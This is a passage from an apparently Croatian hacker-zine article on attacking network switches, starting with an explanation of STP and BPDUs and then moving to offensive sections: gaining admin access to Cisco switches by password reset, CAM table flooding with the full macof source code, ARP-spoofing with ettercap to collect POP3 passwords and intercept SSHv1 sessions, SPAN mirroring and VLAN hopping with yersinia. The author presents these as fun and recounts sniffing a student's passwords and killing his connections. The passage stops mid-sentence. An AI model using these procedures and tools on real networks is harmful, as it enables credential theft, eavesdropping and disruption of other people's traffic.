--==<[  0x03b  STP (BPDU uncovered)
      \_____________________________/
      
  
     Spanning Tree Protocol je link-management protokol koji omogucava
redunanciju path-a dok u isto vrijeme sprecava nastajanje loop-ova na mrezi.
dakle znaci da na bilo kojoj mrezi izmedju dva end-pointa odnosno dva noda
koja komuniciraju postoji samo jedna aktivna putanja! ako se koristi u kojem
slucaju vishe rjesenja tj. ruta za komuniciranje stvaraju se mrezni loopovi
sto automatski znaci da moze doci do duplicirane dostave odredjenog frame-a.
Kada se stvori loop neki switchevi vide nodove na obje komunikacijske strane
samog switcha. ovo naravno sjebe algoritam forwardanja pa se forwardaju 
duplicirani frejmovi. Da bi se postigla redunancija putanja stp definira 
stablo (tree) koje se grana po ostalim switchevima na mrezi. STP baca neke
duplicirane path-ove u standby mod. ako dodje do kakve promjene u STP-u ..
postane nedostupan, promijeni se cost itd. itd. topologija stp-a se 
algoritmom rekonfigurira i aktivira standby link. sve sto se desava STP-om
je potpuno nejasno end-nodovima komunikacije kojima je svejedno koriste li
jedno ili multi segmentno okruzenje.

     ______________-----_____________ 
    | _____________| X |____________ |
    |X             -----            ||
    |X====>blokiranje       switch  ||
  __|X              ___       1   __||
 |<-->|switch      |PC1|<------->|<-->|
 |_S__|      3      _|___|_        |_S__|
    ||           |_______|          ||
    ||                              ||
    ||                              ||
    || switch       ___     switch  ||
  __||   4         |PC2|       2  __|| 
 |<-->|<---------->|___|_        |<-->|----> ROOT
 |_S__|          |_______|       |_RS_|   root switch izabran prema 
    ||                              ||    najmanjem prioritetu (0-65535)
    ||_____loop-free_topologija_____||
    |________________________________| 


Dakle kao sto sam rekao loopovi se eliminiraju STA (Spanning Tree Algoritam)
principom koji omogucava samo jedan aktivni link istodobno izmedju nodova.  
prilikom razmjene informacija izmedju switcheva u igru uskacu BPDU poruke     
odnosno Bridge Protokol Data Units kojima uredjaji detektiraju i uklanjaju
nastale loopove tako da gase odredjene interfejse na kojima su oni prisutni.
isto tako njima se identificiraju root switchevi u topologijama kao i oni
koji samo propagiraju i sudjeluju u STP (STA) loop eliminacijskom procesu!
Root switch je u biti logicki centar stp topologije. BPDU sadrze informacije
o port MAC-ovima, switch prioritetima, port cost-u itd. putem svih ovih
informacija stp u biti odlucuje i definira root switch i root port na mrezi.

BPDU:

-----[code]----- 
 typedef struct {

Bpdu_type  type;
Identifier root_id;
Cost       root_path_cost;
Identifier bridge_id;
Port_id    port_id;
Time       message_age;
Time       max_age;
Time       hello_time;
Time       forward_delay;
Flag       topology_change_acknowledgement;
Flag       topology_change;

} Config_bpdu;
-----[/code]----- 

 32768,x.x.x      [0]         32768,x.x.x    npr.13
  ____|_____ ______|_________ _____|______ ____|____
 | ROOT SID | ROOT PATH COST | SENDER SID | PORT ID |
 |__________|________________|____________|_________|
      |             |              |           |
 tko je root  udaljenost do     SID koji   BPDU source 
    switch    root switch-a    salje BPDU    port

* 32,768 iz u biti 8 bytnog segmenta i 2 bajtnog prioriteta sto je default
za pola vrijednosti 65,535 range. po deafultu BPDU message-i se salju svakih
dvije sekunde! znaci kada se switch starta on pretpostavlja da je root 
switch/bridge i salje interior BPDU-ove. oni sadrze MAC adresu u oba polja
BPDU-a (root B(S)ID i sender B(S)ID) jer kako sam rekao on pretpostavlja da
je on root.. svi switchevi vide bpdu-e i kako dobivaju bpdu-e s manjim root
SID-om tako zamjenjuju root polje sa svojim.. na kraju se za root switch 
postavlja onaj s najmanjom SID vrijednoshchu! slijedi primjer stp veze:

----stp tcpdump----
tcpdump: listening on eth0
000000 0:50:e2:bd:58:42 1:80:c2:0:0:0 0026 64: 802.1d config \
8000.00:50:e2:bd:58:40.8002 root 8000.00:50:e2:bd:58:40 pathcost 0 \
age 0 max 20 hello 2 fdelay 15 
0x0000   4242 0300 0000 0000 8000 0050 e2bd 5840        BB.........P..X@
0x0010   0000 0000 8000 0050 e2bd 5840 8002 0000        .......P..X@....
0x0020   1400 0200 0f00 0000 0000 0000 0000 7800        ..............x.
0x0030   0c00                                           ..
2. 002912 0:50:e2:bd:58:42 1:80:c2:0:0:0 0026 64: 802.1d config \
8000.00:50:e2:bd:58:40.8002 root 8000.00:50:e2:bd:58:40 pathcost 0 \
age 0 max 20 hello 2 fdelay 15 
0x0000   4242 0300 0000 0000 8000 0050 e2bd 5840        BB.........P..X@
0x0010   0000 0000 8000 0050 e2bd 5840 8002 0000        .......P..X@....
0x0020   1400 0200 0f00 0000 0000 0000 0000 7800        ..............x.
0x0030   0c00                                           ..
2. 046164 0:50:e2:bd:58:42 1:80:c2:0:0:0 0026 64: 802.1d config \
8000.00:50:e2:bd:58:40.8002 root 8000.00:50:e2:bd:58:40 pathcost 0 \
age 0 max 20 hello 2 fdelay 15 
0x0000   4242 0300 0000 0000 8000 0050 e2bd 5840        BB.........P..X@
0x0010   0000 0000 8000 0050 e2bd 5840 8002 0000        .......P..X@....
0x0020   1400 0200 0f00 0000 0000 0000 0000 7800        ..............x.
0x0030   0c00                                           ..
3 packets received by filter
0 packets dropped by kernel
----/stp tcpdump---- 

Svaki port na switchu moze biti u jednom od pet stanja. ako se nalazi u
"blocking" stanju prima iskljucivo BPDU-e.. podatkovni frejmovi se odbacuju
i adresa se ne moze saznati. "listening" stanje jest stanje u kojemu switch
utvrdjuje postoji li josh koji nacin da se dodje do root switcha. path koji
nema najmanji cost se vraca u blocked stanje! ovo stanje porta postoji 15
sekundi za razliku od "blocked" stanja koje traje 20 sec. tada se isto
tako primaju samo bpdu-i a podaci se ne forwardaju! iz ovog stanja port
koji koristi STP prelazi u "learning" ili stanje u kojem doznaje MAC-ove
ali i dalje ne propusta data traffic ... ovo traje takodjer 15 sekundi...
na poslijetku dolazi se u "forwarding" stanje u kojem se frejmovi uspjesno
usmjeravaju, primaju BPDU-ovi i doznaju novi MAC-ovi.. takodjer josh 
postoji i peto stanje, a to je "disabled" kada je port u shutdown-u, fail!  
 
stp ce biti zamijenjen rstp-om odnosno Rapid Spanning-Tree Protocol (802.1w)
.. promjene su uglavnom minorne a odnose se na omogucavanje vishepojasnog
generiranja BPDU-a te neke sitnije modifikacije kod stanja portova kao i 
smanjenja vremena za izvrsavanje odredjenih zahtjeva.. 


///////////////////////////////////////////////////////////////////////////
--==<[ 0x04 Having fun
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


     Odmah na pocetku ove sekcije da kazem par bitnih rijeci.. znaci vecina 
metoda i ideja ovdje iznesena jest upravo da se iskoriste propusti switcha 
kako bismo mogli sniffati promet koji zelimo, a dok je idilichno komutirano 
okruzenje to nismo u mogucnosti.. odnosno u ovaj sam dio ubacio puno toga 
sto se ne odnosi na samo dobivanje pristupa na switch vec onesposobljavanje
nekih njegovih funkcija zbog zaobilazenja odredjenih sigurnosnih rjesenja. 
Neke metode se primjenjuju remote principom dok za neke cete morati dobiti 
pristup na switch terminal, neke su pak funkcije legitimno implementirane
na sam IOS a neke izvrsavaju odredjene ilegalne aktivnosti... 


--==<[  0x04a  Password smash
      \_____________________________/


     Ovdje cu pojasniti probijanje odnosno recovery loziki na passworded
cisco 1900,2800 te 2950 Catalyst seriji kada imamo fizicki pristup switchu.
znaci dok se remote princip uglavnom bazira na brute force-anju lozinke 
nekim od brute force alata (hydra..) lokalna metoda ima nekoliko principa.
dakle recimo nalazite se u prostoriji u kojoj su switchevi navedene serije,
(bilo da ste razvalili kakvu 19U ormarchinu or something) ;) nekoliko je 
koraka do full access, admin, pristupa na switch. pa stoga krenimo redom:

znaci switch je vec konfiguriran i podeshen a vi biste SPAN-ali malo..
dakle spojite se straight-trough UTP,STP kabelom na iface i rolloverom na 
console port i spojite se na njega HT-om.. spajanje na interface je cisto
zbog provjere iako je i vishe nego dovoljno samo se laptopom spojiti na
console port rollover kabelom. ht window vam mora biti otvoren i zatim
rebootajte switch i drzite "MODE" gumb na prednjoj strani switcha stisnutim
u vrijeme kada se switch ponovno pali. MODE gumb mozete pustiti nakon sto
se STAT dioda ugasi. prilikom start-up-a trebali bi dobiti output na 
terminal slican ovom:

-----[code]------
C2950 Boot Loader (C2950-NBOOT-M) Version 12.1(11r)EA1, RELEASE
SOFTWARE (fc1)
Compiled Fri 16-May-05 18:57 by sistemac
WS-C2950-24 starting...
Base ethernet MAC address: 00:0a:b7:72:2b:40
Xmodem file system is available.

The system has been interrupted prior to initalizing the flash files
system. The following commands will initialize the flash files system,
and finish loading the operating system. 

flash_init
load_helper
boot
-----[/code]-----

dakle ovakav output bi se trebao pojaviti u terminalu nakon ove akcije..
da biste ponovno inicijalizirali operativni sustav switcha kucajte:

-----[code]------
flash_init
load_helper
dir flash:
-----[/code]-----

zatim rename-ajte file s pass definicijom:

-----[code]------
rename flash:config.text flash:config.old
-----[/code]-----

rebootajte ponovno switch ali sada mozete i softverski .. kucajte:

-----[code]------
Continue with the configuration dialog? [yes/no] : N
-----[/code]-----

zatim ukucajte 

-----[code]------
rename flash:config.old flash:config.text
-----[/code]-----

da biste vratili original filename u EXEC mode promptu!
Nakon toga kopirajte konfiguracijski fajl u memoriju na slijedeci nacin:

-----[code]------
Switch#copy flash:config.text system:running-config
Source filename [config.text]? ENTER
Destination filename [running-config] ENTER
-----[/code]-----

Sada kada ste reload-ali konfiguraciju mozete podesiti novi password:

-----[code]------
configure terminal
(config)no enable secret
(config)enable password ph34rl355
(config)line vty 0 15
(config-line)password ph34rl355
(config-line)exit
copy running-config startup-config
...
-----[/code]-----

Nakon ponovnog reboota switcha vi biste se morali mochi logirati na vty
terminal s "ph34rl355" passwordom ako ne nesto niste napravili kako treba!

ovo gore se iskljucivo odnosi na cisco catalyst 2950 seriju a za 1900 i 2800
seriju slijedeca metoda bi trebala da bude funkcionalna:

!na ovim switchevima mozete uz brisanje i iscitati staru lozinku iz NVRAM-a!

!morate doznati verziju firmwarea!
to mozemo ischitati iz SE menu-a a u njega cemu uci na slijedeci nacin:

iskopcajte kabel od napajanja na switchu!, drzite MODE stisnutim i ponovno
vratite kabel unutra. mode mozete pustiti nakon otprilike dve sekunde nakon
sto se LED-ica iznad 1x porta ugasi!

vjerojatan output:

-----[code]------
Cisco Systems Diagnostic Console
Copyright(c) Cisco Systems, Inc. 1999
All rights reserved.

Ethernet Address: 00-E0-1E-7E-B4-40
ENTER

Diagnostic console - System Engineering
Operation firmware version: 8.00.00 Status: valid
Boot firmware version: 3.02
...
...
-----[/code]-----

Brisanje lozinke na firmware-u >= 1.10!
posle POST-a pitat ce vas:
Do you wish to clear the passwords? [Y]es or [N]o:
naravno ukucajte Y i brisu se lozinke iz NVRAM-a ... stupid thing ..
no pazite imate 10 sekundi za respond inache ce se OS nastavit podizat sam.

Iscitavanje lozinke na firmware-u 1.10 - 3.02!

nakon dobivenog outputa kao sto je gore u prethodnom "---code---"-u izaberite
opciju [S] a nakon toga [V] iz SDI debug interface-a i dobit cete password...
mozete ga promijeniti [M] opcijom u settings-u iako za to tada NEMA potrebe... 


--==<[  0x04b  CAM overflow
      \_____________________________/


     Prva stvar koju cu pojasniti je stara, dobro poznata metoda floodanja
switcha s mnogo MAC adresa i izazivanje njegovog "hub state" stanja ili 
mozda pak njegovog rusenja i reboota.  

Dakle kao sto je vec gore bezbroj puta spomenuto switch mapira sve primljene
MAC-ove na odredjene interfejs portove i tako zna kamo, kome koji frame ide.
Sve to on mapira u MAC adresnu tabelu odnosno u CAM sto stoji za Content
Addressable Memory. Tu se isto tako pohranjuju i informacije o VLAN-ovima
za pojedine interfejse, a CAM naravno ima fiksnu velicinu. Dakle kako radi
CAM u normalnim okolnostima.. recimo da su tri hosta na mrezi... jedan ,dva i
tri.. host 1 salje paket na host 2 a recimo da switch nema u CAM-u mac i port
od hosta dva vec samo od hosta tri... sta ce desava ... switch flood-a frejm
na sve portove osim incoming porta tj. multiplicira frame i salje na
FFFF.FFFF.FFFF adresu odnosno na broadcast adresu. dakle host tri ce isto tako
moci preuzti taj paket ako stavi karticu u PROMIC mode.. ali nakon sto host 
dva vrati frejm nazad hostu jedan switch ce upisati njegov mac na port na koji
je primio frejm ovaj sa reply-em u CAM i nakon toga njih dvoje teoretski 
ostaju sami na mrezi prilikom medjusobne komunikacije.. naglasavam teoretski!

Znaci primjetili ste da ukoliko switch u CAM-u ne pronadje nikakve korisne
informacije o tome kamo da proslijedi odredjeni frame on ce ga poslati na 
FFFF.FFFF.FFFF odnosno bradcast-at ce ga svim na mrezi, a pokupit ce ga onaj
tko ga ocekuje...

U ovu svrhu moguce je vrlo korisno iskoristit alat koji dolazi uz dniff paket
pod nazivom macof. Kodiran je od strane Iana Viteka u perl-u a pred par godina
ga je Dug Song (dsniff) portirao u C. source sam naveo na kraju ovog dijela no
josh je toga za pojasnit pa krenimo dalje.

Spomenuo sam da CAM ima fiksnu velicinu.. upravo na tom principu se zasniva 
cijeli koncept ovog nacina igranja sa switch-em. recimo isti primjer odozgo
sa hostovima jedan, dva i tri. ali recimo da je neki peti host odlucio malo
prosniffati sto se desava na mrezi i da je poslao mnogo MAC-ova na switch koji
ce sve njih staviti u CAM.. naravno CAM ce se napuniti odnosno floodati i nece
biti moguce ostvariti nove unose u tabelu.. sto se desava? zatim se switch 
prebacuje u takozvani `failopen mode' i sve salje na broadcast i naravno host
pet ce preko promisc mode snifanja vidjeti sve sto gmize njegovim lan-om..
U CAM se dakle hashiraju 17 bitne vrijednosti od 63 bitnih informacija
(MAC, VLAN).. nakon sto se ostvari maksimalan broj unosa slijedeci paketi ce 
se floodati. ovaj tip napada se sprijecava podesavanjem port-security 
parametara objasnjenih u nekim od prijasnih sekcija..

nakon pokretanja .macof-a on ce jednostavno generirati i odaslati mnogo mac-ova
i nakon otprilike minutu switch bi trebao biti u `failopen mode' odnosno poceti
se ponasati kao hub.

-----[code]----- 
[haarp@madness]# macof
77:6b:e1:6e:5e:8c 93:2d:ed:45:f9:e3 0.0.0.0.45702 > 0.0.0.0.11000: S   \n
1847390231:1847390231(0) win 512
84:a4:d3:57:ef:8 12:56:52:42:dc:95 0.0.0.0.16630 > 0.0.0.0.3031: S     \n
1484147693:1484147693(0) win 512
88:f0:9:3f:18:89 d:86:53:53:d7:f8 0.0.0.0.15535 > 0.0.0.0.7466: S      \n
293820390:293820390(0) win 512
-----[/code]----- 
 
source:

$Id: macof.c,v 1.13 2000/09/21 03:04:41 dugsong Exp $

-----[/code]-----


#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "version.h"

extern char *ether_ntoa(struct ether_addr *);
extern struct ether_addr *ether_aton(char *);

in_addr_t       Src = 0;
in_addr_t       Dst = 0;
u_char *Tha = NULL;
u_short Dport = 0;
u_short Sport = 0;
char   *Intf = NULL;
int     Repeat = -1;

void
usage(void)
{
        fprintf(stderr, "Version: " VERSION "\n"
                "Usage: macof [-s src] [-d dst] [-e tha] [-x sport] [-y dport]"
                "\n             [-i interface] [-n times]\n");
        exit(1);
}

void
gen_mac(u_char *mac)
{
        *((in_addr_t *)mac) = libnet_get_prand(PRu32);
        *((u_short *)(mac + 4)) = libnet_get_prand(PRu16);
}

int

main(int argc, char *argv[])
{
        int c, i;
        struct libnet_link_int *llif;
        char ebuf[PCAP_ERRBUF_SIZE];
        u_char sha[ETHER_ADDR_LEN], tha[ETHER_ADDR_LEN];
        in_addr_t src, dst;
        u_short sport, dport;
        u_int32_t seq;
        u_char pkt[ETH_H + IP_H + TCP_H];

        while ((c = getopt(argc, argv, "vs:d:e:x:y:i:n:h?V")) != -1) {
                switch (c) {
                case 'v':
                        break;
                case 's':
                        Src = libnet_name_resolve(optarg, 0);
                        break;
                case 'd':
                        Dst = libnet_name_resolve(optarg, 0);
                        break;
                case 'e':
                        Tha = (u_char *)ether_aton(optarg);
                        break;
                case 'x':
                        Sport = atoi(optarg);
                        break;
                case 'y':
                        Dport = atoi(optarg);
                        break;
                case 'i':
                        Intf = optarg;
                        break;
                case 'n':
                        Repeat = atoi(optarg);
                        break;
                default:
                        usage();
                }
        }
        argc -= optind;
        argv += optind;

        if (argc != 0)
                usage();

        if (!Intf && (Intf = pcap_lookupdev(ebuf)) == NULL)
                errx(1, "%s", ebuf);

        if ((llif = libnet_open_link_interface(Intf, ebuf)) == 0)
                errx(1, "%s", ebuf);

libnet_seed_prand();

        for (i = 0; i != Repeat; i++) {

                gen_mac(sha);

                if (Tha == NULL) gen_mac(tha);
                else memcpy(tha, Tha, sizeof(tha));

                if (Src != 0) src = Src;
                else src = libnet_get_prand(PRu32);

                if (Dst != 0) dst = Dst;
                else dst = libnet_get_prand(PRu32);

                if (Sport != 0) sport = Sport;
                else sport = libnet_get_prand(PRu16);

                if (Dport != 0) dport = Dport;
                else dport = libnet_get_prand(PRu16);

                seq = libnet_get_prand(PRu32);

                libnet_build_ethernet(tha, sha, ETHERTYPE_IP, NULL, 0, pkt);

                libnet_build_ip(TCP_H, 0, libnet_get_prand(PRu16), 0, 64,
                                IPPROTO_TCP, src, dst, NULL, 0, pkt + ETH_H);

                libnet_build_tcp(sport, dport, seq, 0, TH_SYN, 512,
                                 0, NULL, 0, pkt + ETH_H + IP_H);

                libnet_do_checksum(pkt + ETH_H, IPPROTO_IP, IP_H);
                libnet_do_checksum(pkt + ETH_H, IPPROTO_TCP, TCP_H);

                if (libnet_write_link_layer(llif, Intf, pkt, sizeof(pkt)) < 0)
                        errx(1, "write");

                fprintf(stderr, "%s ",
                        ether_ntoa((struct ether_addr *)sha));
                fprintf(stderr, "%s %s.%d > %s.%d: S %u:%u(0) win 512\n",
                        ether_ntoa((struct ether_addr *)tha),
                        libnet_host_lookup(Src, 0), sport,
                        libnet_host_lookup(Dst, 0), dport, seq, seq);
        }
        exit(0);
}


-----[/code]-----


--==<[  0x04c  ARP spoofing & SPAN
      \_____________________________/


     Dosli smo i do famoznog arp spoofinga... ARP odnosno address resolution
protocol jest protokol koji resolva MAC adresu preko IP adrese. kako on u
biti radi.. naravno uz mreznu IP (internet protokol) adresu svaki host kao
i mrezni uredjaj ima svoju MAC (Media Access Control) adresu koja je staticka
i teoretski nepromjenjiva... kazem nepromjenjiva u smislu da je ona zauvijek
spremljena u memoriji vaseg mreznog adaptera ali to ne igra neku veliku ulogu
jer ta informacije koja se uzme iz vasheg mreznog adaptera prolazi kroz neko-
liko rutina a tokom tog protoka vrlo lako moze biti promijenjena i na mrezi
predstavljena kao druga.. (npr. mrezni admin mi je podesio MAC sticky port
security na switchu za samo jedan uredjaj koji jedini smije biti na tome
subnetu a svi "mi" ostali na podsubnetu iza firewalla. sad ja sam htio 
skidati DC-om a na firewall-u su zalockani p2p portovi.. a pored mene je taj
stroj koji ne sluzi nicemu a nalazi se spojen direktno na gateway.. naravno
da cu jednostavno promijeniti svoj MAC i predstaviti se switchu kao on i
bez problema koristiti koji god mi protokol padne na pamet! vjerujem da znate
da je u linuxu to jedna linija ifconfig-a ali isto tako za win usere je to
josh jednostavnije.. advanced tab u netcard properties nudi mogucnost vrlo
jednostavne promjene "network address"-a. provjerite uspjesnost s u cmd-u 
ipconfig/all komandom. no ajmo mi na ozbiljnije stvari.. dakle ARP radi tako
da salje ARP zahtjev u kojem pita dest host dali je tvoja IP adresa x.x.x.x?
ako jest vrati mi zahtev sa svojim mac-om! takvi se zahtjevi bradcastaju svim
hostovima na mrezi i svaki pogodjeni host vraca svoj mac reply. 

sad.. koja je najveca greska samog ARP-a! to sto te nitko ne treba nish pitat
vec mu ti mozesh sam reci.. kako? pa lijepo.. ja kazem drugom hostu u 
MAC reply-u "moj IP je src a ovo je moj mac x.x.x.x.x". i host ce jednostavno
bez okljevanja mene ubaciti u svoju arp tabelu. "arp -a" (win/*nix).

to je zapravo arp poisoning... dakle recimo da imamo tri hosta na mrezi..
host1 , host2 i host3... ja sam host3 a host1 i host2 komuniciraju medjusobno
dakle moj je cilj naravno sniffati tu konekciju... (lokalno sniffanje sa
root mashine je trivijalno i nema ga potrebe ovdje ni spominjati.. mislim na
hvatanje passova i drugih stvari lokalno.. dakle samo vam treba sniffit, tcp
dump... i ostalo je rutina..) sad.. ja moram nekako dokazati ostalim hostovima
(host1 i host2) da sam ja zapravo legitiman da s njima komuniciram.. znaci
host1 treba da bude uvjeren da sam upravo ja host2 a host2 obratno.. to cu
postici tako da kazem hostu1 u ARP obavjesti "ciao ja sam x.x.x.x (host2) a
ovo je moj novi MAC (moj mac)".. znate da se u LAN-u komunikacija odvija preko
MAC-a jer je svar layer2 za razliku od layer3 (IP) komunikacije. znaci uzet
cemo moj nadrazi alat "ettercap" i sjesti i ubosti se na mrezu nekog faxa i
za destination postaviti npr. POP3 server i u par minuta dobiti nekoliko
desetaka svjezih lozinki.. kako? pa prilicno jednostavno... gledajte:

kada ja u ettercapu postavim za dest POP3 server a za src addr any desava se
sljedece.. (radi se o nekriptiranoj komunikaciji!!!) moj laptop ce broadcast
-ati svima na mrezi poruku da je POP3_SERVER_IP promijenio MAC i da je njegov
MAC od sada moj mac te ce svi outlook express-ovi i ostala govna slati sve
zahtjeve meni a ettercap ce ih jednostavno prikazati meni ... izgrepati mi
odredjene informacije koje ja zahtjevam i proslijediti sve pravom POP3 
posluzitelju... dakle src host kojeg jebemo nece kuzit nish jer ce se on
sasvim normalno logirati i procitati mail bez znanja da smo mu mi upravo
ulovili pass.. :) 

ovo je genijalna stvar no jako jako stara i osobno nisam to radio vec duzi niz
godina i moguce ju je izvesti i s tonu drugih alata ili kombinacijom vishe 
njih no ettercap koristim prakticki cijeli zivot i nije nikad iznevjerio..
jedino je bed ako se desi ono sto se desilo npr. kod mene na poslu a to je da
segmentirate LAN tj. isjeckate ga bilo VLAN-ovima ili pravim subnetima sto je
za ettercap npr. smrt jer on radi samo u vashem subnetu naravno.. no on 
zaista ima tonu opcija... slijedi pokoji primjer zabave koje pruza ettercap!

===(K kao [K]ill ili [K]onj)===

primjer.. pred par god doshao sam na poslu medju studente, znaci u prostoriju 
gdje je dopusteno studentima da surfaju free i rade prakticki sto god zele.. 
donio sam sa sobom laptop.. (slackware + ettercap).. dosta stariju verziju,
i prikopcao se na mrezu.. sjeo sam si pored lika koji je stalno dolazio skidat
tone shita i onda bi lockao diskove ili nebi dao nikom da sjedne etc... sad 
inace bih mu ja na NAPT firewall-u lijepo ugasio sve konekcije no nisam mogao 
u tom slucaju gledat konju facu jer je server u drugoj prostoriji pa sam se 
tad odlucio na drasticnije mjere.. sjeo ja 20 cm od njega s lap-om .. pokrenuo
si ettercap... i za src_IP stavio njegov IP a za dest stavio any.. i meni 
lijepo izlistani njegovi passovi koje je slao na iskricu, neki shrot_forum 
etc. vidim ja nish taj ne kuzi.. :P.. zato postoji opcija [K]ill.. i lik 
surfa, skida a ja samo "K".. sto god on inicijalizira ja "K" sto naravno salje
paket s RST flag-om i kill-a konekciju.. sjedim tik do njega i on gleda kako 
se meni siri lista konekcija kako god on nesto pokrene i kako to isto tako ne
radi nakon mog [K]illa.. no opet nish ne kuzi. gleda u moj lcd ko tele i nakon
sto je uvidio da nece nish skinut taj dan ode nervozan i nisam ga vidio dugooo
nakon toga.. xexe.. s ettercap-om zabava je zagarantirana... ;)

* sorry ovo je bila mala digresija no ajmo mi dalje...    

to sto je stara metoda mislim iskljucivo na to da ne koristi uspjeshno ako se 
za komunikaciju koriste enkapsulacija odnosno enkripcija kao sto je SSH, SFTP,
HTTPS etc. etc. no ettercap je u te svrhe dobio novi plugin koji sluzi upravo
za to... MITM napad preko kriptiranih protokola.. recimo isti primjer od gore.
host1, 2 i 3.. ja sam 3... host1 se sa ssh spaja na host2.. ja napravim istu
stvar.. znaci arp poisoning i spoofam paket tako da on meni posalje ssh init
request.. no to mi nish ne vrijedi jer moram proslijedit paket a nish korisno
ne dobivam iz njega.. nije tocno!!! ettercap ima mogucnost kreiranja sshv1
emulacijskog servera.. i key generatora.. znaci kao sto ste vjerujem odmah
zakljucili jedino se moramo nadati da ce lik prihvatiti novi ssh key koji mu
mi predstavimo... i kojim cemo mi zapravo dobiti clear informacije na host3!!

Zakljucak:

moglo bi se pisat mali milion linija o ovoj temi no necu dalje jer znam da sto
je veci text manji ce ga broj ljudi procitat.. ;).. ovdje nisam niti spominjao
ip_spoofing odnosno connection hijacking kada su oba hosta van nasheg subneta
jer to nema veze prakticki s ovim.. tu u igru onda ulazi PRNG generator, eriu,
syn flooding etc. etc. i igra sa trusted hostovima... blah blah.. ako bude
interesa mogu o tome napisat opsiran text no za sada nema smisla... 
zapravo ako vas imalo zanimaju mreze i protokoli svjesni ste da je unutar
lokalnog LAN-a moguce raditi zaista sto god pozelite.. prave stvari dolaze u
igru kada sve odlazi izvan kakve ethernet oblasti.. no ajmo mi dalje.. 
    
SPAN (port mirroring):

     Naravno, za razliku od hubova, switchevi sprecavaju promisc snifanje
mreznog prometa te je ono u takvom okruzenju limitirano na broadcast ili
multicast emisiju paketa ili pak klasicno lokalno snifanje. Vecina novijih
switcheva podrzava SPAN tzv. port mirroring cijim ukljucivanjem prakticki
omogucujemo slanje svih paketa na jedan ili vise switch interface-a odnosno
portova a samim time omogucujemo si snifanje cijelog LAN-a primajuci 
traffic na odredjene span-ane portove.. ovo je zapravo korisna funkcija 
integrirana na sam switch pa je stoga jasno da morate imati terminal pristup 
switchu kako biste je ukljucili i koristili.

Ukljucivanje span-anja na cisco switchevima je nalakse preko http sucelja..
jednostavno pristupite SPAN configuration page-u iz SPAN izbornika i dodajte
u lijevi field one portove koje zelite pratiti.. (monitor)

sada npr. podesite Ethernet10 port kao glavni monitoring port i na njega se
spojite sa svojom mashinom na kojoj je neki jednostavan sniffer i dobivate
i analizirate sve sto odredjeni portovi primaju odnosno salju preko swticha.

Cisco Catalyst 2900/3500XL:
-----[code]-----
int fa0/24
port monitor fa0/1
port monitor fa0/2
port monitor fa0/3
^Z
show port monitor
Monitor Port Port Being Monitored
--------------------- ---------------------
FastEthernet0/24 FastEthernet0/1
FastEthernet0/24 FastEthernet0/2
FastEthernet0/24 FastEthernet0/3
-----[/code]-----

Cisco Catalyst 2950 Switch:
-----[code]-----
monitor session 1 source interface Interface
monitor session 1 destination interface Interface
-----[/code]-----

Kazem ovo mozete kada imate legitiman pristup switchu ili nakon sto ste na
neki (samo vama poznat) nacin doshli u mogucnost da mu dobijete pristup!


--==<[  0x04d  VLAN 'hopping'
      \_____________________________/

     
     Evo nakon sto ste, nadam se, naucili neshto o vlan-ovima iz prethodnih
sekcija ovdje cu ukazati na neke sigurnosne propuste koji dolaze do izrazaja
prilikom koristenja virtualnih lanova i njihovog iskoristavanja. max broj
vlan-ova ovisi o samom switchu, vlan1 je management vlan, a sve promjene koje
se obavljaju na vlan-ovima moraju biti obavljane sa VTP serverskog moda. isto
tako za interVLAN komunikaciju potreban je layer3 uredjaj! ... krenimo redom.
VLAN hopping napad se sastoji od tri koraka:

* Hvatanja Frame (informacijski primjer)
* Ubacivanja 802.1q tag-a
* 802.1q frejm na ne trunk-an port

Dakle ideja je da se mi hostom spoofamo kao switch sa ISL ili 802.1q tagovima
tagging enkapsulacije. 

Vecina ljudi iz struke je uvjerena da se VLAN hopping ne moze u praksi izvesti
no ovdje cu dokazati suprotno... istina jest da se neke stvari moraju sloziti
te da je vecina dosadasnjih prezentacija i seminara bila temeljena iskljucivo
na teoriji! napad ukljucuje ARP poisoning o kojem ste naucili iz prethodnog
dijela texta. isto tako admini mogu sprijeciti ovu vrstu napada jednostavnom
konfiguracijom DTP-a odnosno disejblanjem trunking-a no vecina to ne cini ;). 
alat koji cu ovdje koristiti jest yersinia ciji su autori upravo prvi ukazali 
na ovu mogucnost napada na VLAN-ove.

Znaci cilj ove vrste napada jest da sniffamo traffic ili cak izvedemo mitm 
hostu koji se nalazi drugom vlan-u od onog na kojem se nalazimo mi!

Alat podrzava protokole: STP, CDP, DTP, DHCP, HSRP, 802.1Q i VTP. u sushtini
je kao ettercap ali s mnogo proshirenih mogucnosti.. pa krenimo u vlan hopping

pokrenite yersinia-u s ncurses podrskom "-I" i izaberite koji mrezni interface
zelite koristiti u ovu svrhu. kao sto sam rekao napad je moguce uspjesno
izvrsiti samo ako je u igri DTP i ako vidimo DTP pakete koji prolaze mrezom.
stoga pricekajte da vidite potoji li emisija trunking protokol frejmova!
zatim morate inicijalizirati trunk tako sto se prebacite u DTP mod (F5) i 
"d" opcijom u biti generirate pretpostavljene vrijednosti, zatim "X" i "1"
za inicijalizaciju napada odnosno ukljucivanje trunking-a. sada bi trebali
vidjeti i ostale DTP pakete. sada moramo spoofati enkapsulacijske pakete koje
DTP koristi.. to radimo tako da se prebacimo sa (F6) u 802.1q mod ...

VLAN mogucnosti yersinia-e:

* slanje RAW VTP paketa
* brisanje svih VLAN-ova
* brisanje selektiranog VLAN
* dodavanje jednog VLAN

802.1Q:

* slanje RAW 802.1Q paketa
* slanje dvostruko enkapsuliranog 802.1Q paketa
* slanje 802.1Q ARP poisoning-a

 
Kao sto sam rekao nije pretjerano lagano no ako ste lokalno u nekoj firmi i 
znate neke mrezne parametre ovo je i te kako izvedivo.. dakle morate znati
neke informacije kako biste mogli fake-ati 802.1q vtp komunikacijske frejmove
a to su: vlanid hosta kojeg napadamo, njegov gateway, i barem jedan free host
u njegovom subnetu odnosno segmentu u tom VLAN-u. sad naravno moramo napravit
klasican poisoning u ovom slucaju 802.1q arp-a kako bi preusmjerili traffic.
to postizemo init-om deafultnih vrijednosti "i" i "x" za napad te odabirom
802.1q arp spoffing parametra (2). naravno kao sto sam spomenuo potrebujete
gore spomenuta tri segmenta koja morate unijeti kao parametre u sam tijek
napada i preusmjeravanjem traffica dobivate kompletan promet koji target host
salje svom gateway-u.

U cemu je stos.. jasno vam je da trunk po deafultu ima pristup svim vlan-ovima
